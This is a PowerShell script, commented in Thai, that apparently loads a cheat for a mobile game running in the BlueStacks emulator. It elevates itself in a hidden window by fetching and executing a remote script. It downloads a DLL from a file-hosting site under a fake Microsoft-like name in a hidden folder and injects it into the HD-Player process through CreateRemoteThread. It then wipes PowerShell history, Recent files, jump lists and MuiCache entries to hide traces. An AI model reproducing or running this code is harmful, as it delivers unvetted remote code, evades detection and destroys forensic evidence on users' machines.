# =========================================================
# 1. ขอสิทธิ์ Administrator (แบบ Stealth)
# =========================================================
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# =========================================================
# 2. ตั้งค่าไฟล์และการพรางตัว
# =========================================================
$url = "https://files.catbox.moe/0ukxya.dll" 
$fakeName = "mscories.dll" 
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllPath = Join-Path $workDir $fakeName
$targetProcess = "HD-Player" 

# =========================================================
# 3. เคลียร์ทาง (แก้ปัญหาสีแดง: File in use)
# =========================================================
# ปิดโปรเซสที่อาจล็อกไฟล์ไว้ก่อนจะลบหรือโหลดทับ
Stop-Process -Name $targetProcess -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

if (Test-Path $workDir) { 
    # ลบแบบบังคับ ไม่ถามยืนยัน
    Remove-Item $workDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue 
}
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
attrib +h +s $workDir

# =========================================================
# 4. ดาวน์โหลด DLL (แก้ปัญหาสีแดงโดยการเช็คไฟล์ก่อน)
# =========================================================
$ProgressPreference = 'SilentlyContinue'
try {
    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
} catch {
    # ถ้ายังติดสีแดง ให้สุ่มชื่อไฟล์ใหม่เล็กน้อยเพื่อเลี่ยงการล็อก
    $dllPath = Join-Path $workDir "ms_$($fakeName)"
    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
}

# =========================================================
# 5. C# Injector Code
# =========================================================
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# =========================================================
# 6. เริ่มการ Inject
# =========================================================
$proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
if (!$proc) {
    if (Test-Path "C:\Program Files\BlueStacks_nxt\HD-Player.exe") {
        Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
        Start-Sleep -Seconds 10 # รอให้พร้อมจริง
        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    }
}

if ($proc -and (Test-Path $dllPath)) {
    Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
    [Injector]::Inject($proc.Id, $dllPath)
}

# =========================================================
# 7. --- The Ghost Clean (ล้างทุกอย่าง ไม่ถาม ไม่ค้าง) ---
# =========================================================
Start-Sleep -Seconds 5

# ลบไฟล์งาน
Remove-Item $workDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue

# ล้างประวัติ PowerShell
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -Confirm:$false -ErrorAction SilentlyContinue }

# ล้าง Recent / AutomaticDestinations (แก้ปัญหาที่ถามยืนยัน)
$recentPaths = @(
    "$env:APPDATA\Microsoft\Windows\Recent",
    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
)

foreach ($path in $recentPaths) {
    if (Test-Path $path) {
        # ใช้ -Recurse และ -Confirm:$false เพื่อไม่ให้มันเด้งถาม [Y/N]
        Remove-Item -Path "$path\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
    }
}

# ล้าง MuiCache
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-ItemProperty -Path $muiPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "*$fakeName*" -or $_.Name -like "*powershell*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_.Name -Force -Confirm:$false -ErrorAction SilentlyContinue
}

# รีสตาร์ท Explorer (Background)
Start-Job -ScriptBlock {
    Stop-Process -Name explorer -Force
    Start-Sleep -Seconds 1
    Start-Process explorer
} | Out-Null

exit